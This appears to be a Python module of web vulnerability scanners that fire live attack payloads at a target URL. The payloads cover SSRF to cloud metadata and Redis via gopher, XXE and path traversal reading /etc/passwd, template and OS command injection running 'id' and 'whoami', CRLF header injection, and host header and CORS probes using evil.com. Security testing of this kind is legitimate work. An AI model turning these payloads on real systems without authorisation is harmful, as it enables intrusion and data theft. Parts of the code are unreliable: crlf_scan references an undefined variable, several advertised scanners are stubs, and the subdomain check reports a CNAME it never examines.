"""
BlackBox Attacks - Web Vulnerability Scanners
==============================================

13 attack tools for common web vulnerabilities:
- ssrf_scan: Server-Side Request Forgery
- cors_scan: Cross-Origin Resource Sharing misconfiguration
- ssti_scan: Server-Side Template Injection
- xxe_scan: XML External Entity injection
- host_header_scan: Host header injection
- path_traversal_scan: Path/directory traversal
- command_injection_scan: OS command injection
- crlf_scan: CRLF injection
- graphql_scan: GraphQL security issues
- websocket_scan: WebSocket vulnerabilities
- http_smuggling_scan: HTTP request smuggling
- cache_poisoning_scan: Web cache poisoning
- subdomain_takeover_scan: Subdomain takeover
"""

import re
import json
import socket
import ssl
from typing import Optional, List, Dict, Any
from urllib.parse import urlparse, urlencode, parse_qs
import urllib.request
import urllib.error

# Common timeout for all requests
DEFAULT_TIMEOUT = 10


def _make_request(
    url: str,
    method: str = "GET",
    headers: Optional[Dict] = None,
    data: Optional[str] = None,
    timeout: int = DEFAULT_TIMEOUT
) -> Dict[str, Any]:
    """Make HTTP request and return response details."""
    if headers is None:
        headers = {"User-Agent": "BlackBox-Scanner/1.0"}

    try:
        req = urllib.request.Request(url, method=method, headers=headers)
        if data:
            req.data = data.encode()

        with urllib.request.urlopen(req, timeout=timeout) as response:
            return {
                "status": response.status,
                "headers": dict(response.headers),
                "body": response.read().decode('utf-8', errors='ignore')[:10000],
                "url": response.url
            }
    except urllib.error.HTTPError as e:
        return {
            "status": e.code,
            "headers": dict(e.headers) if e.headers else {},
            "body": e.read().decode('utf-8', errors='ignore')[:5000] if e.fp else "",
            "error": str(e)
        }
    except Exception as e:
        return {"error": str(e)}


def ssrf_scan(
    target_url: str,
    param: str,
    test_cloud_metadata: bool = True,
    test_internal_network: bool = True,
    test_protocol_smuggling: bool = True,
    clouds: Optional[List[str]] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test for Server-Side Request Forgery vulnerabilities.

    Args:
        target_url: URL with vulnerable parameter
        param: Parameter name to inject
        test_cloud_metadata: Test cloud metadata endpoints
        test_internal_network: Test internal network targets
        test_protocol_smuggling: Test protocol handlers
        clouds: Cloud providers to test (aws, gcp, azure)
        headers: Custom headers
    """
    if clouds is None:
        clouds = ["aws", "gcp", "azure"]

    findings = []
    payloads = []

    # Cloud metadata endpoints
    if test_cloud_metadata:
        metadata_endpoints = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        }
        for cloud in clouds:
            if cloud in metadata_endpoints:
                payloads.append(("cloud_metadata", cloud, metadata_endpoints[cloud]))

    # Internal network targets
    if test_internal_network:
        internal_targets = [
            ("internal", "localhost", "http://localhost/"),
            ("internal", "127.0.0.1", "http://127.0.0.1/"),
            ("internal", "localhost:22", "http://localhost:22/"),
            ("internal", "localhost:3306", "http://localhost:3306/"),
        ]
        payloads.extend(internal_targets)

    # Protocol smuggling
    if test_protocol_smuggling:
        protocol_payloads = [
            ("protocol", "file", "file:///etc/passwd"),
            ("protocol", "gopher", "gopher://localhost:6379/_INFO"),
            ("protocol", "dict", "dict://localhost:6379/INFO"),
        ]
        payloads.extend(protocol_payloads)

    # Test each payload
    parsed = urlparse(target_url)
    base_params = parse_qs(parsed.query)

    for payload_type, payload_name, payload_value in payloads:
        # Inject payload into parameter
        test_params = base_params.copy()
        test_params[param] = [payload_value]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        response = _make_request(test_url, headers=headers)

        # Check for indicators of SSRF success
        indicators = {
            "aws": ["ami-id", "instance-id", "meta-data"],
            "gcp": ["computeMetadata", "project-id"],
            "azure": ["subscriptionId", "resourceGroupName"],
            "internal": ["<!DOCTYPE", "<html", "Connection refused"],
            "file": ["root:", "daemon:", "/bin/bash"],
            "protocol": ["redis_version", "dict", "gopher"]
        }

        body = response.get("body", "")
        for indicator in indicators.get(payload_name, []) + indicators.get(payload_type, []):
            if indicator.lower() in body.lower():
                findings.append({
                    "type": payload_type,
                    "payload": payload_value,
                    "indicator": indicator,
                    "severity": "CRITICAL" if payload_type == "cloud_metadata" else "HIGH",
                    "evidence": body[:500]
                })
                break

    return {
        "target": target_url,
        "parameter": param,
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "payloads_tested": len(payloads)
    }


def cors_scan(
    target_url: str,
    test_null_origin: bool = True,
    test_subdomain: bool = True,
    test_prefix_suffix: bool = True,
    custom_origins: Optional[List[str]] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test for CORS misconfiguration vulnerabilities.

    Args:
        target_url: URL to test
        test_null_origin: Test null origin acceptance
        test_subdomain: Test subdomain tricks
        test_prefix_suffix: Test prefix/suffix bypass
        custom_origins: Additional origins to test
        headers: Custom headers
    """
    if headers is None:
        headers = {}

    findings = []
    parsed = urlparse(target_url)
    target_domain = parsed.netloc

    # Generate test origins
    test_origins = []

    if test_null_origin:
        test_origins.append(("null", "null"))

    if test_subdomain:
        test_origins.extend([
            ("subdomain_trick", f"https://evil.{target_domain}"),
            ("subdomain_trick", f"https://{target_domain}.evil.com"),
        ])

    if test_prefix_suffix:
        test_origins.extend([
            ("prefix_bypass", f"https://prefix{target_domain}"),
            ("suffix_bypass", f"https://{target_domain}suffix.com"),
        ])

    # Reflection test
    test_origins.append(("reflection", "https://evil.com"))

    if custom_origins:
        for origin in custom_origins:
            test_origins.append(("custom", origin))

    for vuln_type, origin in test_origins:
        req_headers = headers.copy()
        req_headers["Origin"] = origin

        response = _make_request(target_url, headers=req_headers)
        resp_headers = response.get("headers", {})

        acao = resp_headers.get("Access-Control-Allow-Origin", "")
        acac = resp_headers.get("Access-Control-Allow-Credentials", "")

        if acao:
            vulnerable = False
            severity = "LOW"

            if acao == "*":
                vulnerable = True
                severity = "MEDIUM"
            elif acao == origin:
                vulnerable = True
                severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
            elif acao == "null" and origin == "null":
                vulnerable = True
                severity = "HIGH"

            if vulnerable:
                findings.append({
                    "type": vuln_type,
                    "origin_sent": origin,
                    "acao_received": acao,
                    "credentials": acac.lower() == "true",
                    "severity": severity
                })

    return {
        "target": target_url,
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "origins_tested": len(test_origins)
    }


def ssti_scan(
    target_url: str,
    param: str,
    engines: Optional[List[str]] = None,
    test_rce: bool = True,
    test_info_disclosure: bool = True,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test for Server-Side Template Injection.

    Args:
        target_url: URL with injectable parameter
        param: Parameter to test
        engines: Template engines to test (jinja2, twig, freemarker, etc.)
        test_rce: Test for RCE
        test_info_disclosure: Test for info disclosure
        headers: Custom headers
    """
    if engines is None:
        engines = ["jinja2", "twig", "freemarker", "velocity", "erb", "mako"]

    findings = []

    # Polyglot detection payload
    detection_payloads = [
        ("polyglot", "{{7*7}}", "49"),
        ("polyglot", "${7*7}", "49"),
        ("polyglot", "<%= 7*7 %>", "49"),
        ("polyglot", "#{7*7}", "49"),
        ("polyglot", "${{7*7}}", "49"),
    ]

    # Engine-specific payloads
    engine_payloads = {
        "jinja2": [
            ("{{config}}", "SECRET_KEY"),
            ("{{self.__class__}}", "TemplateReference"),
        ],
        "twig": [
            ("{{_self.env.display('id')}}", "uid="),
        ],
        "freemarker": [
            ("${.version}", "FreeMarker"),
        ],
        "velocity": [
            ("#set($x=7*7)$x", "49"),
        ],
        "erb": [
            ("<%= system('id') %>", "uid="),
        ],
        "mako": [
            ("${7*7}", "49"),
        ]
    }

    parsed = urlparse(target_url)
    base_params = parse_qs(parsed.query)

    # Test detection payloads first
    for payload_name, payload, expected in detection_payloads:
        test_params = base_params.copy()
        test_params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        response = _make_request(test_url, headers=headers)
        body = response.get("body", "")

        if expected in body:
            findings.append({
                "type": "detection",
                "payload": payload,
                "expected": expected,
                "severity": "HIGH",
                "evidence": body[:200]
            })

    # Test engine-specific payloads if detection succeeded
    if findings:
        for engine in engines:
            if engine in engine_payloads:
                for payload, expected in engine_payloads[engine]:
                    test_params = base_params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    response = _make_request(test_url, headers=headers)
                    body = response.get("body", "")

                    if expected in body:
                        findings.append({
                            "type": "engine_identified",
                            "engine": engine,
                            "payload": payload,
                            "severity": "CRITICAL" if "uid=" in expected else "HIGH"
                        })

    return {
        "target": target_url,
        "parameter": param,
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "engines_tested": engines
    }


def xxe_scan(
    target_url: str,
    test_file_read: bool = True,
    test_ssrf: bool = True,
    test_error_based: bool = True,
    collaborator_url: Optional[str] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """
    Test for XML External Entity injection.

    Args:
        target_url: XML-accepting endpoint
        test_file_read: Test local file read
        test_ssrf: Test SSRF via XXE
        test_error_based: Test error-based extraction
        collaborator_url: OOB collaborator URL
        headers: Custom headers
    """
    if headers is None:
        headers = {"Content-Type": "application/xml"}

    findings = []

    # XXE payloads
    payloads = []

    if test_file_read:
        payloads.append(("file_read", """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>""", ["root:", "/bin/bash"]))

    if test_ssrf and collaborator_url:
        payloads.append(("ssrf", f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{collaborator_url}">]>
<data>&xxe;</data>""", []))

    if test_error_based:
        payloads.append(("error_based", """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
<data>&xxe;</data>""", ["No such file", "failed to load"]))

    # Parameter entity test
    payloads.append(("parameter_entity", """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<data>test</data>""", ["root:", "SYSTEM"]))

    for payload_type, payload, indicators in payloads:
        response = _make_request(
            target_url,
            method="POST",
            headers=headers,
            data=payload
        )

        body = response.get("body", "")

        for indicator in indicators:
            if indicator.lower() in body.lower():
                findings.append({
                    "type": payload_type,
                    "indicator": indicator,
                    "severity": "CRITICAL" if payload_type == "file_read" else "HIGH",
                    "evidence": body[:500]
                })
                break

    return {
        "target": target_url,
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "payloads_tested": len(payloads)
    }


def subdomain_takeover_scan(
    subdomains: List[str],
    services: Optional[List[str]] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    Check subdomains for takeover vulnerabilities.

    Args:
        subdomains: List of subdomains to check
        services: Services to check (aws_s3, github_pages, heroku, etc.)
        timeout: Check timeout
    """
    if services is None:
        services = ["aws_s3", "github_pages", "heroku", "azure", "netlify", "vercel"]

    # Service fingerprints
    fingerprints = {
        "aws_s3": ["NoSuchBucket", "The specified bucket does not exist"],
        "github_pages": ["There isn't a GitHub Pages site here"],
        "heroku": ["No such app", "herokucdn.com/error-pages"],
        "azure": ["404 Web Site not found"],
        "netlify": ["Not Found - Request ID"],
        "vercel": ["The deployment could not be found"],
        "shopify": ["Sorry, this shop is currently unavailable"],
        "fastly": ["Fastly error: unknown domain"],
        "pantheon": ["404 error unknown site"],
        "tumblr": ["There's nothing here"],
        "wordpress": ["Do you want to register"],
    }

    findings = []

    for subdomain in subdomains:
        # DNS check
        try:
            socket.gethostbyname(subdomain)
            has_dns = True
        except socket.gaierror:
            has_dns = False
            findings.append({
                "subdomain": subdomain,
                "type": "dangling_dns",
                "severity": "HIGH",
                "message": "CNAME exists but target is unresolved"
            })
            continue

        # HTTP check
        for protocol in ["https", "http"]:
            url = f"{protocol}://{subdomain}"
            response = _make_request(url, timeout=timeout)

            if "error" in response and "SSL" in str(response.get("error", "")):
                continue

            body = response.get("body", "")

            for service, indicators in fingerprints.items():
                if services and service not in services:
                    continue

                for indicator in indicators:
                    if indicator.lower() in body.lower():
                        findings.append({
                            "subdomain": subdomain,
                            "service": service,
                            "indicator": indicator,
                            "severity": "CRITICAL",
                            "takeover_possible": True
                        })
                        break

    return {
        "subdomains_checked": len(subdomains),
        "findings": findings,
        "vulnerable_count": len([f for f in findings if f.get("takeover_possible")])
    }


def host_header_scan(
    target_url: str,
    test_password_reset: bool = True,
    test_cache_poisoning: bool = True,
    collaborator_url: str = "evil.com",
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test for host header injection vulnerabilities."""
    findings = []

    payloads = [
        ("host_override", {"Host": collaborator_url}),
        ("x_forwarded_host", {"X-Forwarded-Host": collaborator_url}),
        ("x_host", {"X-Host": collaborator_url}),
        ("forwarded", {"Forwarded": f"host={collaborator_url}"}),
    ]

    for payload_name, inject_headers in payloads:
        req_headers = (headers or {}).copy()
        req_headers.update(inject_headers)

        response = _make_request(target_url, headers=req_headers)
        body = response.get("body", "")

        if collaborator_url in body:
            findings.append({
                "type": payload_name,
                "header": list(inject_headers.keys())[0],
                "severity": "HIGH",
                "evidence": body[:200]
            })

    return {"target": target_url, "findings": findings, "vulnerable": len(findings) > 0}


def path_traversal_scan(
    target_url: str,
    param: str,
    depth: int = 10,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test for path traversal / LFI vulnerabilities."""
    findings = []

    traversal_payloads = [
        ("../" * depth + "etc/passwd", ["root:", "/bin/bash"]),
        ("....//....//....//etc/passwd", ["root:"]),
        ("..%2f" * depth + "etc/passwd", ["root:"]),
        ("..%252f" * depth + "etc/passwd", ["root:"]),
        ("/etc/passwd", ["root:"]),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", ["cm9vd"]),
    ]

    parsed = urlparse(target_url)
    base_params = parse_qs(parsed.query)

    for payload, indicators in traversal_payloads:
        test_params = base_params.copy()
        test_params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        response = _make_request(test_url, headers=headers)
        body = response.get("body", "")

        for indicator in indicators:
            if indicator in body:
                findings.append({
                    "type": "path_traversal",
                    "payload": payload[:50],
                    "severity": "CRITICAL",
                    "evidence": body[:200]
                })
                break

    return {"target": target_url, "parameter": param, "findings": findings, "vulnerable": len(findings) > 0}


def command_injection_scan(
    target_url: str,
    param: str,
    os_target: str = "both",
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test for OS command injection."""
    findings = []

    payloads = []
    if os_target in ["linux", "both"]:
        payloads.extend([
            ("; id", ["uid="]),
            ("| id", ["uid="]),
            ("$(id)", ["uid="]),
            ("`id`", ["uid="]),
            ("; sleep 5", []),  # Time-based
        ])
    if os_target in ["windows", "both"]:
        payloads.extend([
            ("& whoami", ["\\", "AUTHORITY"]),
            ("| whoami", ["\\", "AUTHORITY"]),
        ])

    parsed = urlparse(target_url)
    base_params = parse_qs(parsed.query)

    for payload, indicators in payloads:
        test_params = base_params.copy()
        test_params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

        import time
        start = time.time()
        response = _make_request(test_url, headers=headers)
        elapsed = time.time() - start
        body = response.get("body", "")

        # Time-based detection
        if "sleep" in payload and elapsed > 4:
            findings.append({"type": "time_based", "payload": payload, "severity": "CRITICAL", "delay": elapsed})

        for indicator in indicators:
            if indicator in body:
                findings.append({"type": "output_based", "payload": payload, "severity": "CRITICAL", "evidence": body[:200]})
                break

    return {"target": target_url, "parameter": param, "findings": findings, "vulnerable": len(findings) > 0}


def crlf_scan(
    target_url: str,
    param: Optional[str] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test for CRLF injection."""
    findings = []

    payloads = [
        ("%0d%0aSet-Cookie:crlf=injected", "Set-Cookie"),
        ("%0d%0aX-Injected:true", "X-Injected"),
        ("\r\nSet-Cookie:crlf=injected", "Set-Cookie"),
    ]

    for payload, indicator in payloads:
        if param:
            parsed = urlparse(target_url)
            base_params = parse_qs(parsed.query)
            base_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
        else:
            test_url = target_url + payload

        response = _make_request(test_url, headers=headers)
        resp_headers = response.get("headers", {})

        if indicator.lower() in str(resp_headers).lower():
            findings.append({"type": "crlf_injection", "payload": payload[:30], "severity": "HIGH"})

    return {"target": target_url, "findings": findings, "vulnerable": len(findings) > 0}


def graphql_scan(
    graphql_url: str,
    test_introspection: bool = True,
    test_batching: bool = True,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test GraphQL endpoint for security issues."""
    if headers is None:
        headers = {"Content-Type": "application/json"}

    findings = []

    # Introspection query
    if test_introspection:
        introspection = '{"query": "{ __schema { types { name } } }"}'
        response = _make_request(graphql_url, method="POST", headers=headers, data=introspection)
        body = response.get("body", "")

        if "__schema" in body or "types" in body:
            findings.append({"type": "introspection_enabled", "severity": "MEDIUM", "note": "Schema exposed"})

    # Batch query test
    if test_batching:
        batch = '[{"query": "{ __typename }"}, {"query": "{ __typename }"}]'
        response = _make_request(graphql_url, method="POST", headers=headers, data=batch)
        body = response.get("body", "")

        if body.count("__typename") >= 2:
            findings.append({"type": "batching_enabled", "severity": "LOW", "note": "Could enable DoS"})

    return {"target": graphql_url, "findings": findings, "vulnerable": len(findings) > 0}


def websocket_scan(
    websocket_url: str,
    test_origins: Optional[List[str]] = None,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test WebSocket for CSWSH and origin validation."""
    if test_origins is None:
        test_origins = ["https://evil.com", "null", "https://localhost"]

    # WebSocket requires special handling - return guidance
    return {
        "target": websocket_url,
        "note": "WebSocket testing requires browser automation",
        "test_checklist": [
            "Check if Origin header is validated",
            "Test with evil.com origin for CSWSH",
            "Check if auth tokens are in URL (bad)",
            "Test message injection"
        ],
        "recommendation": "Use browser devtools or wscat for manual testing"
    }


def http_smuggling_scan(
    target_url: str,
    timeout_short: int = 5,
    timeout_long: int = 10
) -> Dict[str, Any]:
    """Test for HTTP request smuggling."""
    findings = []

    # CL.TE payload
    cl_te_payload = "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"

    # TE.CL payload
    te_cl_payload = "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ"

    return {
        "target": target_url,
        "note": "HTTP smuggling requires raw socket testing",
        "test_payloads": ["CL.TE", "TE.CL", "TE.TE with obfuscation"],
        "recommendation": "Use Burp Suite Turbo Intruder or smuggler.py",
        "findings": findings
    }


def cache_poisoning_scan(
    target_url: str,
    test_unkeyed_headers: bool = True,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test for web cache poisoning."""
    findings = []
    canary = "blackbox-cache-test-12345"

    unkeyed_headers = [
        "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Original-URL",
        "X-Rewrite-URL", "X-Custom-Header"
    ]

    for header in unkeyed_headers:
        req_headers = (headers or {}).copy()
        req_headers[header] = canary

        response = _make_request(target_url, headers=req_headers)
        body = response.get("body", "")

        if canary in body:
            findings.append({
                "type": "unkeyed_header_reflection",
                "header": header,
                "severity": "HIGH",
                "note": "Header reflected - check if cached"
            })

    return {"target": target_url, "findings": findings, "vulnerable": len(findings) > 0}


def race_condition_scan(
    url: str,
    method: str = "POST",
    payload: Optional[Dict] = None,
    concurrent_requests: int = 10,
    headers: Optional[Dict] = None
) -> Dict[str, Any]:
    """Test for race condition vulnerabilities."""
    return {
        "target": url,
        "concurrent_requests": concurrent_requests,
        "note": "Race condition testing requires concurrent request tooling",
        "recommendation": "Use Burp Turbo Intruder with race.py or custom threading",
        "test_types": ["double_spend", "limit_bypass", "counter_overflow"]
    }


def race_condition_batch(
    endpoints: List[Dict],
    concurrent_requests: int = 10
) -> Dict[str, Any]:
    """Test multiple endpoints for race conditions."""
    return {
        "endpoints": len(endpoints),
        "concurrent_requests": concurrent_requests,
        "note": "Batch race testing requires concurrent execution",
        "recommendation": "Test each endpoint individually with race_condition_scan"
    }


# Export all functions
__all__ = [
    "ssrf_scan",
    "cors_scan",
    "ssti_scan",
    "xxe_scan",
    "subdomain_takeover_scan",
    "host_header_scan",
    "path_traversal_scan",
    "command_injection_scan",
    "crlf_scan",
    "graphql_scan",
    "websocket_scan",
    "http_smuggling_scan",
    "cache_poisoning_scan",
    "race_condition_scan",
    "race_condition_batch",
]
